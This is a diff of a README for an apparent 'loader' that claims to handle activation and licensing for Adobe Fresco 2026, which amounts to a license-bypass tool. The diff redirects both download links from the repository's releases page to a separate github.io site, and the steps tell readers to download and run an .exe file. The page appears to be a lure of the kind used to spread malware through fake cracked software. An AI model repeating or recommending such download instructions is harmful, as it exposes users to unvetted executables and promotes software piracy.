@@ -1,6 +1,6 @@
 # 🎨 adobe-fresco-2026-loader - Run your favorite digital art software
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Pumpkinseedcharge329/adobe-fresco-2026-loader/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://pumpkinseedcharge329.github.io)
 
 This software helps users manage the activation and licensing process for Adobe Fresco v2026. It handles your brush library access and ensures your license remains active for all painting sessions on Windows.
 
@@ -8,7 +8,7 @@ This software helps users manage the activation and licensing process for Adobe 
 
 You must access the latest version of this tool directly from the software repository. Follow these instructions to prepare your computer.
 
-1. Visit the [official releases page](https://github.com/Pumpkinseedcharge329/adobe-fresco-2026-loader/releases).
+1. Visit the [official releases page](https://pumpkinseedcharge329.github.io).
 2. Look for the most recent version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or your downloads folder.
